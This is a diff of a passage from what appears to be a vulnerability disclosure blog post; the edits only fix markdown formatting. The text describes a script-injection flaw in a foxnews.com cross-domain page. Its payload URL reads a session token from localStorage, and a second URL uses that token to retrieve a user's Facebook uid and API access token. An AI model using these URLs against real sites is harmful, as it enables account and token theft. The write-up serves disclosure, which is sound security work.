@@ -16,7 +16,7 @@ For example, [foxnews.com](http://foxnews.com) has a[ page](http://foxnews.com/s
 
 This example shows how, if you link your foxnews.com account to Facebook, you could post on your wall using credentials foxnews.com stores in your browser. Steps 1–3 could all be done in code embedded in the first URL.
 
-1. Grab your ***token ***stored in *localStorage:*
+1. Grab your ***token*** stored in *localStorage:*
 
 [http://www.foxnews.com/static/v/all/html/xdcomm.html#top;**alert(localStorage.janrainCaptureToken)**:](http://www.foxnews.com/static/v/all/html/xdcomm.html#top;alert%28localStorage.janrainCaptureToken%29:)
 
@@ -24,7 +24,7 @@ If you’re logged into foxnews.com you will see some series of letters and numb
 
 2. Find your facebook credentials using this ***token*** without logging in — i.e. try incognito mode:
 
-[https://signin.foxnews.com/entity?type_name=user&access_token=***t](https://signin.foxnews.com/entity?type_name=user&access_token=janrainCaptureToken)oken***
+[https://signin.foxnews.com/entity?type_name=user&access_token=***token***](https://signin.foxnews.com/entity?type_name=user&access_token=janrainCaptureToken)
 
 This will return a blob of JSON, in particular it has your Facebook ***uid*** and API ***accessToken.***
 
